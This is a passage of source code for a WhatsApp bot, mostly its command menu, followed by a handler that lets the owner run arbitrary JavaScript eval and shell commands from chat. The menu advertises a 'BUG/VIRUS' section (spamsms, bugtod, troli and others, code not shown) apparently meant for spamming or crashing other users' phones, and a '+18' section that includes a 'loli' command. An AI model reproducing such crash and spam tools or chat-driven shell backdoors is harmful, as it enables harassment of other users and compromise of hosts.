
» ${prefix}gitclone

» ${prefix}lirica

» ${prefix}gitstalk

» ${prefix}stalkig

» ${prefix}tiktok

» ${prefix}ytsearch

» ${prefix}google

» ${prefix}play

» ${prefix}googleimg

» ${prefix}ytmp3

» ${prefix}ytmp4

» ${prefix}getvideo

» ${prefix}getmusic

» ${prefix}ytsvideo

» ${prefix}ytsmusic

» ${prefix}song

» ${prefix}cellinfo

» ${prefix}playstore

» ${prefix}SsWeb

» ${prefix}npmsearch

» ${prefix}imgpareja

» ${prefix}spotify

» ${prefix}pinterest

» ${prefix}ringtone

» ${prefix}wikimedia

» ${prefix}wallpaper

» ${prefix}cafe

  「 ANIME/+18 」

» ${prefix}loli

» ${prefix}pack

» ${prefix}ero

» ${prefix}waifu2

» ${prefix}cry

» ${prefix}kill

» ${prefix}hug

» ${prefix}pat

» ${prefix}lick

» ${prefix}kiss

» ${prefix}bite

» ${prefix}yeet

» ${prefix}bully

» ${prefix}bonk

» ${prefix}wink

» ${prefix}poke

» ${prefix}nom

» ${prefix}slap

» ${prefix}smile

» ${prefix}wave

» ${prefix}awoo

» ${prefix}blush

» ${prefix}smug

» ${prefix}glomp

» ${prefix}happy

» ${prefix}dance

» ${prefix}cringe

» ${prefix}cuddle

» ${prefix}highfive

» ${prefix}shinobu

» ${prefix}megumin

» ${prefix}handhold

» ${prefix}nekost

» ${prefix}neko

» ${prefix}milf

» ${prefix}doge

» ${prefix}animestick

   「 MAKER 」

» ${prefix}3d-effect

» ${prefix}1917-style

» ${prefix}3d-rubystone

» ${prefix}3d-text-sub-zombie

» ${prefix}3dengraved

» ${prefix}3dluxury

» ${prefix}3dlove

» ${prefix}3dgolden

» ${prefix}3dgradient

» ${prefix}3dneonlight

» ${prefix}3dpapercut

» ${prefix}3drainbow

» ${prefix}3drealistic

» ${prefix}3dscifi

» ${prefix}3dtext-effect

» ${prefix}3dunderwater

» ${prefix}3dwaterpipe

» ${prefix}alice-league-of-kings

» ${prefix}angel-wing-galaxy

» ${prefix}anubis

» ${prefix}arch-crossfire

» ${prefix}art-shader

» ${prefix}assassins-creed

» ${prefix}azzenka-league-of-kings

» ${prefix}birthday-cards

» ${prefix}birthday-greeting

» ${prefix}birthday-roses

» ${prefix}black-metal

» ${prefix}blood-frosted

» ${prefix}blood-text

» ${prefix}blue-effect

» ${prefix}blue-glitter

» ${prefix}brickwall

» ${prefix}brokentext

» ${prefix}bubble-effect

» ${prefix}bulb-effect

» ${prefix}circuit

» ${prefix}dark-gold-metal

» ${prefix}color-fireworks

» ${prefix}cool-metal

» ${prefix}decorated-cookie

» ${prefix}deluxe-gold

» ${prefix}dinamo

» ${prefix}deluxe-silver

» ${prefix}double-exposure

» ${prefix}dragon-fire

» ${prefix}eroded-metal

» ${prefix}firework

» ${prefix}fox-crossfire

» ${prefix}fun-certify1

» ${prefix}fun-certify2

» ${prefix}futuristic

» ${prefix}galaxy-effect2

» ${prefix}galaxy-effect

» ${prefix}galaxy-angel

» ${prefix}galaxy-text

» ${prefix}galaxy-text-3

» ${prefix}gankk-league-of-kings

» ${prefix}genji-overwatch

» ${prefix}glossy

» ${prefix}glossy-bluemetal

» ${prefix}glossy-carbon

» ${prefix}glossy-chrome

» ${prefix}gold-avenger

» ${prefix}gold-barcar

» ${prefix}gold-batman

» ${prefix}gold-fox

» ${prefix}gold-bird2

» ${prefix}gold-eagle

» ${prefix}gold-effect

» ${prefix}gold-glitter

» ${prefix}gold-lion

» ${prefix}gold-lion2

» ${prefix}gold-star

» ${prefix}gold-tiger

» ${prefix}golden-letter

» ${prefix}gr-crossfire

» ${prefix}graffiti-color

» ${prefix}graffiti-text3

» ${prefix}graffiti-text5

» ${prefix}graffiti-text8

» ${prefix}graffiti-text4

» ${prefix}heart-birthday

» ${prefix}hanzo-overwatch

» ${prefix}greenhorror

» ${prefix}halloween-fire

» ${prefix}green-brush

» ${prefix}hero3-crossfire

» ${prefix}heart-cups

» ${prefix}holographic

» ${prefix}light-text

» ${prefix}lend-text

» ${prefix}ledtext

» ${prefix}layeredtext

» ${prefix}lol-caitlyn

» ${prefix}lol-ahri

» ${prefix}logo-galaxy

» ${prefix}lol-fizz

» ${prefix}lol-ezreal-and-shen

» ${prefix}lol-fiora

» ${prefix}lol-draven

» ${prefix}lol-jinx

» ${prefix}lol-kalista

» ${prefix}lol-khazix

» ${prefix}lol-kogmaw

» ${prefix}lol-leesin

» ${prefix}lol-lux

» ${prefix}lol-master-yi

» ${prefix}lol-miss-fortune

» ${prefix}lol-nidalee

» ${prefix}lol-quinn

» ${prefix}lol-sona

» ${prefix}lol-riven

» ${prefix}lol-talon

» ${prefix}machines-effect

» ${prefix}lol-vayne

» ${prefix}machines-effect

» ${prefix}lol-yasuo

» ${prefix}lol-zed

» ${prefix}lol-wukong

» ${prefix}magic-text

» ${prefix}mei-overwatch

» ${prefix}matrix-text

» ${prefix}magmatext

» ${prefix}metal-lion-2

» ${prefix}metal-headshot

» ${prefix}metal-avenger

» ${prefix}metal-real-madrid

» ${prefix}metal-star

» ${prefix}metal-superman

» ${prefix}metal-text-effect

» ${prefix}metallic-letter

» ${prefix}metalic

» ${prefix}metal-wolf-2

» ${prefix}mganga-league-of-kings

» ${prefix}miniontext

» ${prefix}modern-gold-3

» ${prefix}modern-gold-4

» ${prefix}modern-gold-5-pro

» ${prefix}modern-gold-green

» ${prefix}modern-gold-purple

» ${prefix}modern-gold-red

» ${prefix}modern-gold-sliver

» ${prefix}modern-goldred

» ${prefix}neon

» ${prefix}neon-2

» ${prefix}neon-brightblue

» ${prefix}neon-effects

» ${prefix}neon-light-galaxy

» ${prefix}neon-satin

» ${prefix}neondevil

» ${prefix}neonlight

» ${prefix}neontext-light

» ${prefix}paper-cut

» ${prefix}paperart

» ${prefix}rainbow-effect

» ${prefix}reaper-overwatch

» ${prefix}birthdaycake

» ${prefix}redhot-metal

» ${prefix}resht-league-of-kings

» ${prefix}science

» ${prefix}sfg-crossfire

» ${prefix}sketch

» ${prefix}wetglass

» ${prefix}watercolor

» ${prefix}water-effect

» ${prefix}water-3d

» ${prefix}violet-league-of-kings

» ${prefix}snowtext

» ${prefix}soldier-overwatch

» ${prefix}sunlight-shadow

» ${prefix}transformer

» ${prefix}glitch

» ${prefix}leonlogo

» ${prefix}lisatxt

» ${prefix}sings

» ${prefix}breakingnew

» ${prefix}retrowb

» ${prefix}diploma

» ${prefix}esfrase

» ${prefix}einstein

» ${prefix}trump

» ${prefix}anonymous-neon

» ${prefix}jail

» ${prefix}pixelate

» ${prefix}blur

» ${prefix}imagesketch

» ${prefix}triggeredwebp

» ${prefix}shit

» ${prefix}burn

» ${prefix}invert

» ${prefix}wanted

» ${prefix}rip

   「 WEB/CHECKS 」

» ${prefix}payment

» ${prefix}iploc

» ${prefix}myip

» ${prefix}ipinfo

» ${prefix}checknumber

» ${prefix}veriphone

» ${prefix}weather

   「 EDITOR VN 」

» ${prefix}blown

» ${prefix}deep

» ${prefix}saturado

» ${prefix}fast

» ${prefix}fat

» ${prefix}nightcore

» ${prefix}reversa

» ${prefix}robot

» ${prefix}lento

» ${prefix}suave

» ${prefix}ardilla

   「 MAIN 」

» ${prefix}delcmd

» ${prefix}listcmd

» ${prefix}addmsg

» ${prefix}getmsg

» ${prefix}listmsg

» ${prefix}delmsg

   「 ANÓNIMO 」

» ${prefix}anonymous

» ${prefix}salirc

» ${prefix}start

» ${prefix}next

   「 INFO 」

» ${prefix}ping

» ${prefix}runtime

» ${prefix}latencia

» ${prefix}owner

» ${prefix}report

» ${prefix}solicitar

» ${prefix}menu

» ${prefix}reglas

» ${prefix}comprarbot

   「 BUG/VIRUS 」
   
» ${prefix}spamsms

» ${prefix}blockspam

» ${prefix}catalog

» ${prefix}docu

» ${prefix}bugtod

» ${prefix}bug1

» ${prefix}lokas

» ${prefix}troli

» ${prefix}bugtag

» ${prefix}catalogpc

   「 CREADOR 」

» ${prefix} >

» ${prefix} $

» ${prefix} =>

» ${prefix} >>

» ${prefix}join
  
   「 TANKS TO 」

➣  ║▌│█║▌│ █║▌│█│║▌║
➣  ║▌│█║▌│ █║▌│█│║▌║

➣ Copyright © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 2022
`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": thumb,
}
}), { userJid: m.chat, quoted: m })
simple.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    simple.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
